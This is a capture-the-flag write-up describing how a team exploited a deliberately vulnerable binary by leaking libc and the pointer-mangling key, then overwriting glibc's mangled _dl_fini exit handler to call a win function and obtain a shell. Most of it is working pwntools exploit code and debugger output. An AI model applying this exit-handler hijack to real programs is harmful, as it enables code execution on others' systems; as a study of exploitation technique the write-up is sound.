Last week, my team and I played our final competition in the [CyberCup](https://cybercup.it) tournament, the **MntcrlCTF 2026**. I really liked this challenge because it serves as a perfect “Baby-Exitfuncs” scenario to refresh my knowledge about this technique.

## The Code

The source code is quite simple. We have a `win()` function (our target) and the `main` function:

```
    int main()
    
    {
    
      int i; // [rsp+4h] [rbp-1Ch]
    
      _QWORD *num; // [rsp+8h] [rbp-18h] BYREF
    
      __int64 v5; // [rsp+10h] [rbp-10h] BYREF
    
      unsigned __int64 canary; // [rsp+18h] [rbp-8h]
    
    
    
    
      canary = __readfsqword(0x28u);
    
    
    
    
      puts("Here's a little gift");
    
      printf("%#016lx\n", ld_sample);
    
    
    
    
      puts("I'll give you a gift, enter a number");
    
      for ( i = 0; i <= 2; ++i )
    
      {
    
        __isoc23_scanf("%ld", &num);
    
        printf("%#016lx\n", *num);
    
      }
    
      puts("No more gifts now!");
    
    
    
    
      __isoc23_scanf("%ld", &num);
    
      __isoc23_scanf("%ld", &v5);
    
      *num = v5;
    
      exit(0);
    
    }
```

The first thing the program does is hand us a free pointer to the first byte of the dynamic loader (`ld`) mapped area. Then, it grants us three arbitrary address reads by letting us input an address and printing its contents. Finally, it gives us one arbitrary address write before calling `exit(0)`.

So, what can we overwrite to get a shell? I’ve already spoiled it, but looking at the `checksec` output confirms our path: Full RELRO means the GOT is read-only, and the `exit(0)` at the end renders standard return address overwrites useless since the function never actually returns. Furthermore, that `ld` pointer leak is a massive hint. Notice that the executable is not PIE, so the address of our win function is fixed.

## Getting the info we need

First, we can find the position of libc by looking for a pointer to it in the loader-mapped area. This can be easily done using the `p2p` pwndbg command:

```
    pwndbg> p2p ld libc
    
    00:0000│     0x7ffff7ffca28 —▸ 0x7ffff7e6d5e0 (realloc) ◂— push r15
    
    00:0000│     0x7ffff7ffca30 —▸ 0x7ffff7e6cc90 (malloc) ◂— test rdi, rdi
    
    00:0000│     0x7ffff7ffca38 —▸ 0x7ffff7e6d240 (free) ◂— test rdi, rdi
    
    00:0000│     0x7ffff7ffca40 —▸ 0x7ffff7e6dc00 (calloc) ◂— mov rax, rdi
    
    00:0000│     0x7ffff7ffca48 —▸ 0x7ffff7e61380 (pthread_mutex_unlock) ◂— mov esi, 1
    
    00:0000│     0x7ffff7ffca50 —▸ 0x7ffff7e5f8d0 (pthread_mutex_lock) ◂— mov edx, dword ptr [rdi + 0x10]
    
    00:0000│     0x7ffff7ffdbc0 —▸ 0x7ffff7dc7000 ◂— 0x3010102464c457f
```

We can calculate the distance between `ld` and the address within the loader where the `calloc` pointer is stored. By adding this offset to our `loader_leak` variable, we can request the actual address of `calloc`.

Once we have that address, we subtract `calloc`’s internal offset to calculate the real libc base address.

```
    loader_leak = int(r.recvline(), 16)
    
    
    
    
    calloc_leak_pos = loader_leak +  0x35a28
    
    r.sendline(bstr(calloc_leak_pos))
    
    libc_addr = int(r.recvline(), 16) - libc.sym.calloc
    
    aleak("libc_base", libc_addr)
```

Now we can choose how we want to get the mangling key. I decided not to read the key directly, but rather to reverse the mangling math. For this, we need to read the already-mangled `_dl_fini` pointer from the `initial` exit function list, which is always registered by default.

In this challenge, the target was running a Debian glibc version, and my `pwninit` script didn’t fetch the debug symbols, so I couldn’t just grab the offset via `libc.symbols.initial`. Instead, I decided to dynamically break at `exit` and inspect the arguments passed to `__run_exit_handlers`.

```
    0x7f02944ae090 <exit>       sub    rsp, 8
    
    0x7f02944ae094 <exit+4>     mov    ecx, 1                    ECX => 1
    
    0x7f02944ae099 <exit+9>     mov    edx, 1                    EDX => 1
    
    0x7f02944ae09e <exit+14>    lea    rsi, [rip + 0x1a45db]     RSI => 0x7f0294652680 —▸ 0x7f0294653fe0 ◂— 0
    
    0x7f02944ae0a5 <exit+21>    call   0x7f02944ade00 #__run_exit_handlers
```

In this case, `0x7f0294653fe0` is the address of `initial`. By subtracting the glibc base from it, we get the exact offset we need:

```
    exit_funcs = libc_addr + 0x1e8fe0
    
    aleak("exit_funcs_list", exit_funcs)
```

Now, we can read the mangled address:

```
    r.sendline(bstr(exit_funcs+0x18))
    
    mangled_dl_fini = int(r.recvline().strip(), 16)
    
    vleak("mangled _dl_fini pointer", mangled_dl_fini)
```

Finally, to recover the key, we just need to calculate the real address of `_dl_fini`. Since we already leaked the loader base earlier, this is trivial.

```
    def get_key(encoded, real):
    
      return ror(encoded, 0x11, 64) ^ real
    
    
    
    
    _dl_fini = loader_leak + 23552
    
    key = get_key(mangled_dl_fini, _dl_fini)
    
    vleak("key", key)
```

We have three arbitrary reads available, but we’ve only used two. Since we don’t need any additional information to build our exploit, you can point this last read anywhere.

```
    r.sendline(bstr(exit_funcs))
    
    r.recvuntil(b"No more gifts now!\n")
```

## Overwriting _dl_fini

Now we can finish our exploit by calculating the mangled `win` address:

```
    def mangle_exit(pointer, key):
    
        return rol(pointer ^ key, 0x11, 64)
    
    
    
    
    win = exe.sym.win
    
    mangled_win = mangle_exit(win, key)
    
    vleak("mangled_win", mangled_win)
```

Next, we use our single arbitrary write to overwrite the existing mangled `_dl_fini` pointer. Because our `win` function doesn’t require any arguments, we don’t need to worry about controlling the argument pointer, even though the `ef_cxa` flavor technically allows for it.

```
    r.send(bstr(exit_funcs + 0x18) + b" ")
    
    r.sl(bstr(mangled_win))
    
    
    
    
    r.interactive()
```

And with this, we get a shell.
